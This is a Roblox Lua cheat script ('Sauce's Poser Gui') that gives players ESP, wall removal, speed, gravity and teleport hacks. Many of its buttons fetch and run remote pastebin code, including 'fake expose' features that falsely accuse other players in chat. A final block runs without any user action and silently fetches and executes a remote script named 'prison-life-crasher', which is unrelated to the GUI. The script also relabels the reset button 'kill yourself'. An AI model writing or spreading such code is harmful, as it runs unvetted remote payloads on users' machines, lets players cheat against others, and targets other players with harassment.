local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character and character:FindFirstChild("Humanoid")
-----------------------------------------------------------------random funi things--------------------------------------------------------------------------------------------------------------------------------------------------------------
game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.BottomButtonFrame.ResetCharacterButtonButton.ResetCharacterButtonTextLabel.Text = "kill yourself" --change reset charcter button to kill yourself lol
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local Window = Fluent:CreateWindow({
	Title = "Sauce's Poser Gui v0.2.5",
	SubTitle = "sauce_boss01 in discord",
	TabWidth = 160,
	Size = UDim2.fromOffset(580, 460),
	Acrylic = true, 
	Theme = "Dark",
	MinimizeKey = Enum.KeyCode.T
})


local Tabs = {
	ExposeA = Window:AddTab({ Title = "Expose to chat", Icon = "message-square" }),
	--ExposeB = Window:AddTab({ Title = "Expose in GUI", Icon = "terminal-square" }),
	Fake = Window:AddTab({ Title = "Fake Expose (in chat)", Icon = "flame" }),
	Map = Window:AddTab({ Title = "Map", Icon = "map" }),
	Esp = Window:AddTab({ Title = "ESP", Icon = "crosshair" }),
	User =  Window:AddTab({ Title = "Player", Icon = "user" }),
	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}


local Options = Fluent.Options

--[[
 ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌            ▐░▌ ▐░▌  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄    ▐░▐░▌   ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀    ▐░▌░▌   ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌            ▐░▌ ▐░▌  ▐░▌          ▐░▌       ▐░▌          ▐░▌▐░▌          
▐░█▄▄▄▄▄▄▄▄▄  ▐░▌   ▐░▌ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
 --]]
Tabs.ExposeA:AddParagraph({
	Title = "wip",
	Content = "This script is still work in progress"
})

Tabs.ExposeA:AddButton({
	Title = "Expose Poser (he)",
	Description = "expose the poser (chat)",
	Callback = function()

		getgenv().un = " he's the poser"
		loadstring(game:HttpGet('https://pastebin.com/raw/q9gEVtSE'))()
	end
})

Tabs.ExposeA:AddButton({
	Title = "Expose Poser (she)",
	Description = "expose the poser (chat)",
	Callback = function()

		getgenv().un = " she's the poser"
		loadstring(game:HttpGet("https://pastebin.com/raw/q9gEVtSE"))()
	end
})


Tabs.ExposeA:AddButton({ 
	Title = "Expose Poser + username (he)",
	Description = "expose poser and his username (chat)",
	Callback = function()

		getgenv().un = " he's the poser"
		getgenv().uj = " his"

		loadstring(game:HttpGet("https://pastebin.com/raw/ZdmQfi95"))()
	end
})


Tabs.ExposeA:AddButton({ 
	Title = "Expose Poser + username (she)",
	Description = "expose poser and his username (chat)",
	Callback = function()

		getgenv().un = " she's the poser"
		getgenv().uj = " her"

		loadstring(game:HttpGet("https://pastebin.com/raw/ZdmQfi95"))()
	end
})

--[[
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌          ▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀           ▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌▐░▌  ▐░▌                    ▐░▌            ▐░▌ ▐░▌  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌░▌   ▐░█▄▄▄▄▄▄▄▄▄           ▐░█▄▄▄▄▄▄▄▄▄    ▐░▐░▌   ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌    ▐░░░░░░░░░░░▌          ▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░█▀▀▀▀▀▀▀▀▀           ▐░█▀▀▀▀▀▀▀▀▀    ▐░▌░▌   ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌▐░▌  ▐░▌                    ▐░▌            ▐░▌ ▐░▌  ▐░▌          ▐░▌       ▐░▌          ▐░▌▐░▌          
▐░▌          ▐░▌       ▐░▌▐░▌ ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄           ▐░█▄▄▄▄▄▄▄▄▄  ▐░▌   ▐░▌ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌          ▐░▌       ▐░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌          ▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀            ▀         ▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                                                                     
--]]


Tabs.Fake:AddButton({
	Title = "Fake Expose Poser (he)",
	Description = "expose the wong poser (chat)",
	Callback = function()

		getgenv().un = " he's the poser"
		loadstring(game:HttpGet("https://pastebin.com/raw/6Ay5UZK3"))()
	end
})

Tabs.Fake:AddButton({
	Title = "Fake Expose Poser (she)",
	Description = "expose the wong poser (chat)",
	Callback = function()

		getgenv().un = " she's the poser"
		loadstring(game:HttpGet("https://pastebin.com/raw/6Ay5UZK3"))()
	end
})

Tabs.Fake:AddButton({ 
	Title = "Fake Expose Poser + Username (she)",
	Description = "expose wrong poser with fake username (chat)",
	Callback = function()

		getgenv().un = " she's the poser"
		getgenv().uj = " her"

		loadstring(game:HttpGet("https://pastebin.com/raw/wD0siEPp"))()
	end
})

Tabs.Fake:AddButton({ 
	Title = "Fake Expose Poser + Username (he)",
	Description = "expose wrong poser with fake username (chat)",
	Callback = function()

		getgenv().un = " he's the poser"
		getgenv().uj = " his"

		loadstring(game:HttpGet("https://pastebin.com/raw/wD0siEPp"))()
	end
})


--[[ 
                                           
 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
 ▀         ▀  ▀         ▀  ▀           
                                       
  
--]]

local Toggle = Tabs.Map:AddToggle("MyToggle", { Title = "Delete outside stage walls", Default = false })

local isToggled = false

Toggle:OnChanged(function()
	isToggled = not isToggled
	if isToggled then
		------------------------------
		workspace.Map.Barriers.Barrier.Part.CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[2].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[3].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[4].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[5].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[6].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[7].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[8].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[9].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[10].CanCollide = false
		workspace.Map.Barriers.Barrier:GetChildren()[11].CanCollide = false
		------------------------------
	else
		------------------------------
		workspace.Map.Barriers.Barrier.Part.CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[2].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[3].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[4].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[5].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[6].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[7].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[8].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[9].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[10].CanCollide = true
		workspace.Map.Barriers.Barrier:GetChildren()[11].CanCollide = true           

	end
end)

Options.MyToggle:SetValue(false)
------------------------------------------------------------

local Toggle = Tabs.Map:AddToggle("MyToggle", { Title = "Delete inside stage walls", Default = false })

local isToggled = false

Toggle:OnChanged(function()
	isToggled = not isToggled
	if isToggled then
		------------------------------
		workspace.Map.Barriers.StageBarrier.CanCollide = false
		------------------------------
	else
		------------------------------
		workspace.Map.Barriers.StageBarrier.CanCollide = true

	end
end)

Options.MyToggle:SetValue(false)


--[[ 

 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌                    ▐░▌▐░▌          
▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░▌          
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀           
                                       
--]]                  

local Toggle = Tabs.Esp:AddToggle("Chams", { Title = "Chams", Default = false })

local FillColor = Color3.fromRGB(175, 25, 255)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255, 255, 255)
local OutlineTransparency = 0

local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local connections = {}
local storage

local function Highlight(plr)
	local Highlight = Instance.new("Highlight")
	Highlight.Name = plr.Name
	Highlight.FillColor = FillColor
	Highlight.DepthMode = DepthMode
	Highlight.FillTransparency = FillTransparency
	Highlight.OutlineColor = OutlineColor
	Highlight.OutlineTransparency = 0
	Highlight.Parent = storage

	local plrchar = plr.Character
	if plrchar then
		Highlight.Adornee = plrchar
	end

	connections[plr] = plr.CharacterAdded:Connect(function(char)
		Highlight.Adornee = char
	end)
end

local function RemoveHighlight(plr)
	local plrname = plr.Name
	if storage[plrname] then
		storage[plrname]:Destroy()
	end
	if connections[plr] then
		connections[plr]:Disconnect()
	end
end

local function ToggleHighlight()
	if storage then
		for _, player in pairs(Players:GetPlayers()) do
			if player ~= lp then  -- Exclude LocalPlayer
				RemoveHighlight(player)
			end
		end
		storage:Destroy()
		storage = nil
	else
		storage = Instance.new("Folder")
		storage.Parent = CoreGui
		storage.Name = "Highlight_Storage"

		for _, player in pairs(Players:GetPlayers()) do
			if player ~= lp then  -- Exclude LocalPlayer
				Highlight(player)
			end
		end

		Players.PlayerAdded:Connect(function(player)
			if player ~= lp then
				Highlight(player)
			end
		end)
		Players.PlayerRemoving:Connect(function(player)
			if player ~= lp then
				RemoveHighlight(player)
			end
		end)
	end
end

Toggle:OnChanged(function()
	ToggleHighlight()  
end)

Options.Chams:SetValue(false)


--------name

local Toggle = Tabs.Esp:AddToggle("Names", { Title = "Names", Default = false })

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local isEnabled = false -- Set this to false initially if you want it to start as disabled

local billboard_gui = Instance.new("BillboardGui")
billboard_gui.Active = true
billboard_gui.AlwaysOnTop = true
billboard_gui.ClipsDescendants = true
billboard_gui.LightInfluence = 1
billboard_gui.Size = UDim2.new(5, 0, 2, 0)
billboard_gui.StudsOffset = Vector3.new(0, 0.3, 0)
billboard_gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local text_label = Instance.new("TextLabel")
text_label.Font = Enum.Font.Unknown
text_label.Text = "placeHolder"
text_label.TextColor3 = Color3.new(1, 1, 1)
text_label.TextScaled = true
text_label.TextSize = 14
text_label.TextStrokeTransparency = 0.2
text_label.TextStrokeColor3 = Color3.new()
text_label.BackgroundTransparency = 1
text_label.BorderColor3 = Color3.new(0, 0, 0)
text_label.Size = UDim2.new(1, 0, 1, 0)
text_label.Parent = billboard_gui
text_label.Name = "nameText"

local function updateESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            local rootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")

            if isEnabled and rootPart and not rootPart:FindFirstChild("NameESP") then
                local billboard_guiClone = billboard_gui:Clone()
                billboard_guiClone.Name = "NameESP"
                billboard_guiClone:FindFirstChild("nameText").Text = player.Name
                billboard_guiClone.Parent = rootPart
            elseif not isEnabled and rootPart and rootPart:FindFirstChild("NameESP") then
                rootPart:FindFirstChild("NameESP"):Destroy()
            end
        end
    end
end

RunService.RenderStepped:Connect(updateESP)

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        if isEnabled and player ~= Players.LocalPlayer then
            updateESP()
        end
    end)
end)

-- Toggle the ESP
local function toggleESP()
    isEnabled = not isEnabled
    if isEnabled then
        updateESP()
    else
        for _, player in pairs(Players:GetPlayers()) do
            local rootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if rootPart and rootPart:FindFirstChild("NameESP") then
                rootPart:FindFirstChild("NameESP"):Destroy()
            end
        end
    end
end

Toggle:OnChanged(function()
toggleESP()
end)

Options.Names:SetValue(false)

--[[ 
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌               ▐░▌          ▐░▌          ▐░▌     ▐░▌▐░▌    ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌          ▐░▌          ▐░▌     ▐░▌ ▐░▌   ▐░▌▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░▌          ▐░▌     ▐░▌  ▐░▌  ▐░▌▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░▌          ▐░▌          ▐░▌     ▐░▌   ▐░▌ ▐░▌▐░▌ ▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
          ▐░▌▐░▌               ▐░▌          ▐░▌          ▐░▌     ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌          ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌          ▐░▌      ▄▄▄▄█░█▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░▌     ▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀            ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
--]]                                                                                                               

----------------------------------------------------------

-- Hand the library over to our managers
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- You can add indexes of elements the save manager should ignore
SaveManager:SetIgnoreIndexes({})

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)


Window:SelectTab(1)

Fluent:Notify({
	Title = "Sauce's Poser Gui",
	Content = "The script has been loaded succesfully.",
	Duration = 8
})


-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()

--[[



 ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ 
▐░▌          ▐░▌          ▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌     ▐░▌  
▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ 
▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌
 ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 



--]]



Tabs.User:AddParagraph({
	Title = "Warning",
	Content = "If theres nothing here it means that your character isnt loaded in, please re-execute when it is."
})

--sliders

--------------------------------speed
local UserSpeed = humanoid and humanoid.WalkSpeed
local Slider = Tabs.User:AddSlider("Slider", {
	Title = "Walk Speed",
	Description = "Change your character's speed",
	Default = 0,
	Min = 1,
	Max = 500, 
	Rounding = 0,
	Callback = function(Value)

		local player = game.Players.LocalPlayer

		if player and player.Character then

			local humanoid = player.Character:FindFirstChild("Humanoid")
			if humanoid then
				humanoid.WalkSpeed = Value
			end
		end
	end
})

Slider:SetValue(UserSpeed)
------------------------------------jump
humanoid.UseJumpPower = true
local UserJump = humanoid and humanoid.JumpPower

local Slider = Tabs.User:AddSlider("Slider", {
	Title = "Jump Power",
	Description = "Change your character's jump power",
	Default = 0,
	Min = 0,
	Max = 400, 
	Rounding = 0,
	Callback = function(Value)

		local player = game.Players.LocalPlayer

		if player and player.Character then

			local humanoid = player.Character:FindFirstChild("Humanoid")
			if humanoid then
				humanoid.JumpPower = Value
			end
		end
	end
})

Slider:SetValue(UserJump)

------------------------------------------hip height

local UserHeight = humanoid and humanoid.HipHeight or 0
local Slider = Tabs.User:AddSlider("Slider", {
	Title = "HipHeight",
	Description = "Change your character's hip height",
	Default = 0,
	Min = 1.9,
	Max = 30, 
	Rounding = 1,
	Callback = function(Value)

		local player = game.Players.LocalPlayer

		if player and player.Character then

			local humanoid = player.Character:FindFirstChild("Humanoid")
			if humanoid then
				humanoid.HipHeight = Value
			end
		end
	end
})

Slider:OnChanged(function(Value)
	local player = game.Players.LocalPlayer

	if player and player.Character then

		local humanoid = player.Character:FindFirstChild("Humanoid")
		if humanoid then
			humanoid.HipHeight = Value
		end
	end
end)

Slider:SetValue(UserHeight)

print("hh: " .. UserHeight)

------------------------------------FOV
local UserFov = game.Workspace.Camera.FieldOfView

local Slider = Tabs.User:AddSlider("Slider", {
	Title = "FOV",
	Description = "Change your field of view (default is 70)",
	Default = UserFov,
	Min = 0,
	Max = 120,
	Rounding = 0,
	Callback = function(Value)

		local player = game.Players.LocalPlayer

		if player and player.Character then

			if humanoid then
				UserFov = Value
			end
		end
	end
})

Slider:OnChanged(function(Value)

	if player and player.Character then

		local humanoid = player.Character:FindFirstChild("Humanoid")
		if humanoid then
			game.Workspace.Camera.FieldOfView = Value
		end
	end
end)

Slider:SetValue(UserFov)
--------------------------------------------------------Gravity

local GameGravity = game:GetService("Workspace").Gravity

local function updateGravity()
	game:GetService("Workspace").Gravity = GameGravity

end

local Slider = Tabs.User:AddSlider("Slider", {
	Title = "Gravity",
	Description = "Change the gravity value",
	Default = GameGravity,
	Min = 0,
	Max = 400,
	Rounding = 0,
	Callback = function(Value)
		GameGravity = Value
		updateGravity() 
	end
})

print("g: " .. GameGravity)

Slider:SetValue(GameGravity)


updateGravity()

-------------BUTTONS-------------------

----------------------------------------Invisibility
Tabs.User:AddButton({
	Title = "invisibility",
	Description = "become your father",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/2ucYrZ9H", true))()
	end
})
--------------------------------------tp tool
Tabs.User:AddButton({
	Title = "Teleport Tool",
	Description = "name says all",
	Callback = function()
		mouse = game.Players.LocalPlayer:GetMouse()
		tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = "teleport tool (real!1!1)"
		tool.Activated:connect(function()
			local pos = mouse.Hit+Vector3.new(0,2.5,0)
			pos = CFrame.new(pos.X,pos.Y,pos.Z)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		end)
		tool.Parent = game.Players.LocalPlayer.Backpack
	end
})

----------------------------------------
if not _G.hasExecuted2 then
_G.ScriptIs = "Poser GUI"
print (tostring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/PrintCredit/main/print", true)))
loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/a", true))()
_G.hasExecuted2 = true
end
